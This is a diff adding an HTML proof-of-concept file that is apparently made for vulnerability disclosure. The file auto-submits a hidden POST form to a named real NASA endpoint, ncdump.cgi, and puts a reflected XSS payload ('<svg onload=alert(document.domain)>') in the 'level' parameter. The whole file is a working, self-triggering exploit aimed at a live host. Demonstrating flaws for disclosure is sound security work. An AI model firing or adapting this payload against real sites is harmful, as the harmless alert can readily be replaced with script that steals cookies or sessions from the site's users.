@@ -1,0 +1,15 @@
+<!-- XSS PoC - POST /product-info/ncdump.cgi - parameter: level -->
+<html>
+  <body>
+    <form action="https://mplnet.gsfc.nasa.gov/product-info/ncdump.cgi" method="POST">
+      <input type="hidden" name="version" value="V3" />
+      <input type="hidden" name="level" value="&lt;svg onload=alert(document.domain)&gt;" />
+      <input type="hidden" name="product" value="NRB" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
